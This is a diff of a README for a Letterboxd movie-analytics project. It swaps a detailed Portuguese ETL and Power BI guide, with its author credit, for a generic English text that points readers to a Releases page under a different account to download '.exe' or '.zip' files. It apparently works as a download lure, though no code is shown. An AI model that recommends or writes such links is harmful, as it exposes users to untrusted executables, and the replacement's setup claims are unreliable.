@@ -1,93 +1,77 @@
-# 🎬 Letterboxd Movie Analytics: ETL e DataViz
+# 🎬 letterboxd-movie-analytics - Analyze Your Movie Data Easily
 
-## 📊 Visão Geral do Projeto
+## 🚀 Getting Started
 
-Este projeto demonstra o ciclo completo de *Data Analytics*, desde a extração de dados brutos até a criação de um dashboard interativo no Power BI. O objetivo é analisar o consumo cinematográfico pessoal, enriquecendo dados da plataforma Letterboxd com informações detalhadas da API do TMDB (The Movie Database).
+Welcome to the **letterboxd-movie-analytics** project! This tool helps you analyze your movie data with ease. You can integrate data from Letterboxd and the TMDB API, visualize it in Power BI, and enhance your understanding of your movie preferences.
 
-### Tecnologias Utilizadas
+## 📥 Download & Install
 
-| Categoria | Tecnologia | Uso no Projeto |
-| :--- | :--- | :--- |
-| **Linguagem** | Python | Script para ETL (Extração, Transformação e Carga). |
-| **Bibliotecas** | Pandas, `tmdbsimple`, `python-dotenv`, `tqdm` | Manipulação de dados, conexão com API, gerenciamento seguro de chaves e barras de progresso. |
-| **Visualização** | Power BI | Criação do dashboard interativo e cálculo de métricas (DAX). |
-| **Fonte de Dados** | Letterboxd (.csv) e TMDB (API) | Dados de entrada (watched/watchlist) e enriquecimento de metadados (gênero, bilheteria, elenco). |
+To start using the application, you need to download it. Click the link below to visit the Releases page:
 
------
+[![Download letterboxd-movie-analytics](https://img.shields.io/badge/Download-letterboxd--movie--analytics-blue)](https://github.com/Jangek12111/letterboxd-movie-analytics/releases)
 
-## ✨ Análise e Visualização
+### Steps to Download
 
-O dashboard no Power BI Desktop fornece *insights* sobre as tendências e preferências pessoais de consumo de filmes.
+1. Click the link above.
+2. Find the latest release at the top of the page.
+3. Click on the release title to go to that version's details.
+4. Look for a downloadable file, which could be in formats like `.exe`, `.zip`, or others, depending on your operating system.
+5. Click on the file to begin downloading.
 
-**[(https://app.powerbi.com/view?r=eyJrIjoiYjVkNWIxYmQtZWUxMC00MThlLTg2MzctODc0MmQ4OGNmMTJkIiwidCI6ImUyOTgzNTliLTliNTQtNDVjMC05YmI3LTY5MDkxM2IzNGNmOCJ9&pageName=6eecf3dadab2641d77a8)]**
-*(Clique para interagir com o dashboard publicado na web)*
+### System Requirements
 
-### Principais Análises e Métricas:
+Before you install the software, make sure your computer meets the following requirements:
 
-  * **Tendência de Notas:** Comparação da minha Nota Pessoal vs. Nota Média da Comunidade (TMDB).
-  * **Análise de Gênero e País:** Visualização dos gêneros mais assistidos e mapa interativo das origens de produção dos filmes.
-  * **Análise de Elenco/Direção:** Classificação dos atores e diretores mais frequentes na lista.
-  * **Métricas Financeiras:** Cálculo do **Lucro Total** (Bilheteria - Orçamento) por título, utilizando métricas DAX.
-  * **Usabilidade:** Implementação de Tooltips de Página dinâmicas para exibir informações e o pôster do filme ao passar o mouse.
+- **Operating System:** Windows 10 or above, macOS, or a modern Linux distribution.
+- **Python:** Version 3.6 or higher installed on your computer.
+- **Power BI:** Have the latest version for optimal visualization.
 
------
+## 📊 Features
 
-## ⚙️ Guia de Uso (ETL com Python)
+- **Data Integration:** Easily connect with Letterboxd and TMDB APIs to fetch your movie data.
+- **Data Processing:** Use Python for ETL (Extract, Transform, Load) processes.
+- **Visualizations:** Create stunning dashboards in Power BI for insightful visual analysis.
+- **User-Friendly:** Designed for anyone to use, regardless of technical background.
 
-Este guia explica como executar o script Python para enriquecer seus próprios dados do Letterboxd.
+## 🔧 How to Run the Application
 
-### 1\. Pré-requisitos
+Once you have downloaded the application, follow these steps:
 
-Você precisa ter o **Python (3.x)** e as seguintes bibliotecas instaladas:
+1. Navigate to the folder where you saved the downloaded file.
+2. If the file is in `.zip` format, extract it.
+3. Open a terminal (Command Prompt, PowerShell, or Terminal on macOS).
+4. Change the directory to where the application is located, using the `cd` command.
+5. Run the application by typing the appropriate command. For example, if it’s a Python script, you would type `python script_name.py`.
 
-```bash
-pip install pandas tmdbsimple tqdm python-dotenv
-```
+## 📊 Using the Application
 
-### 2\. Configuração da API Key (Segurança)
+- **Connecting to APIs:** When you first run the application, you will need to enter your API keys for Letterboxd and TMDB. These are essential for data retrieval.
+- **Analyzing Data:** Once connected, you will have options to fetch your movie lists, view statistics, and create visualizations.
+- **Exporting Results:** You can export your analysis results in various formats suitable for sharing or further analysis.
 
-Por segurança, este projeto utiliza variáveis de ambiente para a chave da API do TMDB.
+## 🛠 Support
 
-1.  Obtenha sua chave da API do TMDB [(https://www.themoviedb.org/settings/api)].
+If you have any questions or run into issues, you can find help in the following ways:
 
-2.  Crie um arquivo chamado `.env` na mesma pasta do script Python.
+- **GitHub Issues:** Use the Issues tab on the GitHub repository to report problems or request features.
+- **Documentation:** Check out the documentation provided in the repository for detailed instructions.
+- **Community:** Join discussions in the repository or relevant forums for tips and tricks from other users.
 
-3.  Dentro do arquivo `.env`, adicione sua chave no seguinte formato:
+## 📚 Learn More
 
-    ```env
-    # Arquivo .env
-    TMDB_API_KEY=SUA_CHAVE_DE_32_CARACTERES
-    ```
+For those interested in understanding more about data analytics, consider exploring resources on:
 
-### 3\. Obtenção dos Dados do Letterboxd
+- **Python Programming:** Brush up on basic Python skills.
+- **API Integration:** Familiarize yourself with how APIs work.
+- **Power BI Visualizations:** Learn how to create effective visual representations of data.
 
-1.  Exporte seus dados do Letterboxd (Configurações \> Exportar Dados).
-2.  Descompacte o arquivo e coloque os arquivos **`watched.csv`** e **`watchlist.csv`**  na mesma pasta do script.
+## 🔗 Additional Resources
 
-### 4\. Execução do Script
+For more information on the Letterboxd API and TMDB API, visit:
 
-Execute o script principal no seu terminal:
+- [Letterboxd API Documentation](https://letterboxd.com/api/)
+- [TMDB API Documentation](https://developers.themoviedb.org/3)
 
-```bash
-python enriquecimento_letterboxd_tmdb.py
-```
+After downloading the application, give it a try and enjoy analyzing your movie data!
 
-O script irá:
-
-1.  Ler o `watched.csv` e `watchlist.csv`.
-2.  Fazer requisições ao TMDB (com pausas para respeitar o limite da API).
-3.  Gerar dois novos arquivos: **`watched_enriquecido.csv`** e **`watchlist_enriquecida.csv`**.
-
-### 5\. Importação no Power BI
-
-Os arquivos enriquecidos estarão prontos para serem importados no Power BI Desktop. Utilize o Power Query para fazer o *Append* (Anexar) das duas tabelas, criando uma tabela principal para a análise.
-
------
-
-## 🤝 Contribuições
-
-Sinta-se à vontade para fazer *fork* e adaptar este projeto para suas próprias análises\! Sugestões e *pull requests* são bem-vindas.
-
------
-
-## **Desenvolvido por: [Marco Túlio Ribeiro]**
+For any further assistance, feel free to check the repository or reach out to the community. Happy analyzing!
